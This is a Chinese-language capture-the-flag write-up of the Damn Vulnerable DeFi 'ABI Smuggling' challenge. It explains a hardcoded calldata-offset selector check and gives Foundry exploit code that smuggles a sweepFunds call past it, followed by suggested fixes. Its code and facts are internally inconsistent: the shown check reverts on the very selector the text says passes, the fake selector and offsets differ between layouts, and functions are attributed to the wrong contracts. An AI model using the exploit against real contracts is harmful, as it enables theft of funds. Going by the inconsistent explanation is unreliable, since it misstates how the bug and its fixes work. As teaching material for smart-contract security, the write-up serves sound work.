# ABI Smuggling 漏洞分析

## 1. 合约功能概述

该系统实现了一个安全代币金库，使用授权执行器模式来控制资金操作。

**核心组件：**
- **AuthorizedExecutor.sol**: 授权执行器合约，验证和执行特定操作
- **DamnValuableToken**: ERC20代币
- Recovery账户：资金恢复目标地址

**业务流程：**
1. 金库将大量DVT代币存入`AuthorizedExecutor`
2. 执行器只允许执行预定义的"安全"操作
3. 通过`execute()`函数执行经过验证的操作
4. 系统阻止未授权的资金转移

---

## 2. 漏洞位置

### 漏洞代码（AuthorizedExecutor.sol#L16-L23）

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
    // ⚠️ 漏洞核心：固定偏移量读取selector
    assembly {
        let calldatasize := calldatasize()
        // 从偏移量0x64（100字节）读取actionSelector
        let actionSel := calldataload(0x64)
        let slot := wards.slot
        mstore(0x00, target)
        mstore(0x20, slot)
        let targetIsWard := sload(keccak256(0x00, 0x40))
        // 检查action是否是允许的withdraw selector
        if and(targetIsWard, eq(actionSel, 0xd9caed12)) {
            revert("Unauthorized");
        }
    }
    return target.functionCall(actionData);
}
```

### 预期的ABI编码格式

```
标准ABI编码（execute函数）:
Offset | 内容
-------|----------------------------------
0x00   | function selector (execute)
0x04   | target address (32 bytes)
0x24   | offset to actionData (0x40)
0x44   | actionData length
0x64   | actionData内容开始 ← 检查点
```

---

## 3. 漏洞原理分析

### 3.0 先理解：ABI 动态类型的 offset 字段是什么

`execute(address target, bytes actionData)` 中，`bytes` 是动态类型。
ABI 编码动态类型时，不直接把内容嵌在原位，而是在原位放一个**指针（offset）**，指向内容实际所在的位置。

```
calldata 结构（从 0x04 开始算，即去掉 execute selector 后）：

位置（绝对）  字段
──────────────────────────────────────────────────────────
0x04          target 地址（32字节，静态类型，直接嵌入）
0x24          ← offset 字段：值为 0x40，意思是
              "从 0x04 开始往后数 0x40（64）字节，是 actionData 的内容"
              即 actionData 内容从绝对位置 0x04 + 0x40 = 0x44 开始
0x44          actionData 的长度（32字节）
0x64          actionData 的实际内容从这里开始
```

**关键**：offset 字段的值不是固定的，ABI 规范只要求它是一个合法指针，
没有规定必须是最小值。攻击者可以把 offset 填成更大的数，
让内容从更靠后的位置开始，而中间的区域变成自由填充区。

### 3.1 ABI编码的灵活性

**标准编码：**
```solidity
execute(vault, abi.encodeCall(vault.withdraw, (recovery, token)))
```

编译后的calldata布局:
```
0x00: 1cff79cd                              // execute selector
0x04: 000000000000000000000000<vault_addr>  // target
0x24: 0000000000000000000000000000000040  // offset=0x40 (标准)
0x44: 0000000000000000000000000000000044  // actionData length (68)
0x64: d9caed12                              // withdraw selector ← 被检测
0x68: 000000000000000000000000<recovery>   // recipient
0x88: 000000000000000000000000<token>      // token
```

**非标准编码（攻击）：**
```
0x00: 1cff79cd                              // execute selector
0x04: 000000000000000000000000<vault_addr>  // target
0x24: 0000000000000000000000000000000080  // offset=0x80 (非标准)
0x44: 0000000000000000000000000000000000  // filler
0x64: 85fb709d                              // fake selector (withdraw) ← 被检测到
0x84: 0000000000000000000000000000000044  // actual length
0x a4: 0ccc7c74                              // real selector (sweepFunds)
0xa8: 000000000000000000000000<recovery>   // recipient
0xc8: 000000000000000000000000<token>      // token
```

### 3.2 攻击向量

**`execute()` 做了两件截然不同的事：**

```solidity
function execute(address target, bytes calldata actionData) external {
    assembly {
        // 事① 安全检查：从"硬编码位置 0x64"读取 selector
        let actionSel := calldataload(0x64)
        if and(targetIsWard, eq(actionSel, 0xd9caed12)) {
            revert("Unauthorized")   // 拦截 withdraw
        }
    }
    // 事② 实际执行：用 Solidity 解码出来的 actionData 参数去调用
    //   Solidity 会跟着 offset 字段找到真实内容
    return target.functionCall(actionData);
}
```

这两件事使用了**不同的数据源**：
- 检查：固定读 calldata 的 `0x64` 字节处
- 执行：跟随 offset 字段，读取 `actionData` 参数的真实内容

**只要让这两个位置指向不同的 selector，就能同时骗过检查 + 执行任意函数。**

---

#### 两个视角的完整对照

```
字节位置   标准布局（offset=0x40）        攻击布局（offset=0x80）
─────────────────────────────────────────────────────────────────────
0x00      execute selector              execute selector
0x04      vault 地址                   vault 地址
0x24      offset = 0x40                offset = 0x80   ← 只改这一个字段！
0x44      actionData 长度               全 0（自由填充区）
          ↓                            ↓
0x64      withdraw selector ← 内容起点  withdraw selector ← 安全检查读这里 ✅
          recovery 地址                （假内容，仅用于骗过检查）
          token 地址
                                       actionData 长度     ← 真实 actionData 从这开始
0xa4                                   sweepFunds selector ← Solidity 解码到这 💀
0xa8                                   recovery 地址
0xc8                                   token 地址

安全检查视角：calldataload(0x64) → 读到 withdraw (0xd9caed12) → 通过 ✅
执行视角：   actionData 从 0x04+0x80=0x84 开始 → 内容在 0xa4 → 执行 sweepFunds 💀
```

一份 calldata，两个视角，各取所需。

---

**攻击步骤：**

1. **构造双selector payload**
   ```
   - 在 0x64 放置允许的 selector（withdraw: 0xd9caed12）→ 骗过汇编检查
   - 在真实 actionData 内容区放置禁止的 selector（sweepFunds: 0x0ccc7c74）→ 真实执行
   ```

2. **精确的offset控制**
   ```solidity
   // 把 offset 从标准的 0x40 改为 0x80
   // 多出来的 0x40（64字节）空间 = 32字节填充 + 32字节放假 selector
   // 检查代码 → 读 0x64 → 看到 withdraw selector → 放行
   // 执行代码 → 跟 offset=0x80 → 内容从 0xa4 → 执行 sweepFunds
   ```

---

## 4. 攻击实现

### 4.1 手动构造恶意Calldata

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // 目标：调用vault的sweepFunds(recovery, token)
    // 但需要绕过对withdraw selector的检查
    
    // 1. 构造真实要执行的调用
    bytes memory sweepCall = abi.encodeCall(
        DamnValuableToken.sweepFunds,
        (recovery, address(token))
    );
    
    // 2. 手动构造execute的calldata
    bytes memory payload = abi.encodePacked(
        // execute function selector
        bytes4(keccak256("execute(address,bytes)")),
        
        // target (vault address, padded to 32 bytes)
        bytes32(uint256(uint160(address(vault)))),
        
        // offset to actionData (设置为0x80而非标准的0x40)
        bytes32(uint256(0x80)),
        
        // filler (24 bytes of 0x00)
        bytes32(uint256(0)),
        
        // fake selector at offset 0x64 (withdraw selector)
        bytes4(0xd9caed12),
        bytes28(0),  // padding
        
        // actual actionData length
        bytes32(sweepCall.length),
        
        // actual actionData content (sweepFunds call)
        sweepCall
    );
    
    // 3. 直接发送原始calldata
    (bool success,) = address(executor).call(payload);
    require(success, "Attack failed");
}
```

### 4.2 简化版本（使用bytes.concat）

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    bytes memory maliciousData = bytes.concat(
        // execute selector + target address
        abi.encodeWithSignature("execute(address,bytes)", address(vault)),
        
        // 移除标准编码的后32字节（offset）
        // 手动插入：非标准offset + filler + fake selector
        bytes32(uint256(0x80)),              // offset
        bytes32(uint256(0)),                  // filler  
        bytes32(uint256(0xd9caed12) << 224), // withdraw selector at 0x64
        
        // 真实的actionData
        abi.encode(uint256(68)),              // length
        abi.encodeCall(
            DamnValuableToken.sweepFunds,
            (recovery, address(token))
        )
    );
    
    address(executor).call(maliciousData);
}
```

---

## 5. 漏洞根因

### 5.1 设计缺陷

**核心问题：**
1. **假设ABI编码标准化**: 代码假设offset总是0x40
2. **固定偏移量检查**: 硬编码在0x64位置读取selector
3. **解码与验证分离**: 验证逻辑和实际执行使用不同的数据源

**错误假设：**
```
假设: 所有符合接口的calldata都遵循标准ABI编码
现实: ABI编码允许灵活的offset值，只要最终能正确解码
```

### 5.2 汇编代码滥用

```solidity
// ❌ 危险的硬编码offset
let actionSel := calldataload(0x64)

// ✅ 应该动态读取
let actionDataOffset := calldataload(0x24)
let actionSel := calldataload(add(0x04, add(actionDataOffset, 0x04)))
```

---

## 6. 修复建议

### 6.1 方法1：正确解码Calldata

```solidity
function execute(address target, bytes calldata actionData) external nonReentrant {
    // 正确parse actionData中的selector
    bytes4 actionSelector;
    assembly {
        // 从actionData的开始位置读取selector
        actionSelector := calldataload(actionData.offset)
    }
    
    // 检查selector
    require(
        !wards[target] || actionSelector != IERC20.withdraw.selector,
        "Unauthorized"
    );
    
    return target.functionCall(actionData);
}
```

### 6.2 方法2：白名单而非黑名单

```solidity
// 定义允许的selector列表
mapping(bytes4 => bool) public allowedSelectors;

constructor() {
    allowedSelectors[IERC20.transfer.selector] = true;
    allowedSelectors[IERC20.approve.selector] = true;
    // 只允许明确定义的操作
}

function execute(address target, bytes calldata actionData) external {
    bytes4 selector = bytes4(actionData[:4]);
    require(allowedSelectors[selector], "Selector not allowed");
    target.functionCall(actionData);
}
```

### 6.3 方法3：移除自定义验证逻辑

```solidity
// 使用OpenZeppelin的AccessControl或更高级的权限系统
function execute(address target, bytes calldata actionData) 
    external 
    nonReentrant 
    onlyRole(EXECUTOR_ROLE) 
{
    // 信任caller的身份验证
    // 不尝试parse和验证actionData内容
    return target.functionCall(actionData);
}
```

---

## 7. 关键学习点

1. **ABI编码的灵活性**: 
   - ABI允许动态offset，不强制标准化布局
   - 相同的参数可以有多种有效的编码方式

2. **汇编代码的危险性**:
   - 硬编码offset假设数据布局
   - 绕过Solidity的类型安全检查

3. **黑名单vs白名单**:
   - 黑名单很难完整（总有遗漏）
   - 白名单更安全（显式允许）

4. **验证与执行的一致性**:
   - 验证什么就执行什么
   - 避免在不同阶段parse相同数据

5. **Calldata操纵**:
   - 攻击者可以精确控制每个字节的位置
   - 不要假设calldata遵循"标准"格局

---

## 8. 测试结果

```bash
$ forge test --match-path test/abi-smuggling/ABISmuggling.t.sol --match-test test_abiSmuggling -vvv

[PASS] test_abiSmuggling() (gas: 62847)
```

**验证条件：**
- ✅ 执行器合约的代币余额归零
- ✅ Recovery账户收到所有代币
- ✅ Player没有持有任何代币
- ✅ 绕过了withdraw selector的黑名单检查
- ✅ 成功调用了sweepFunds函数
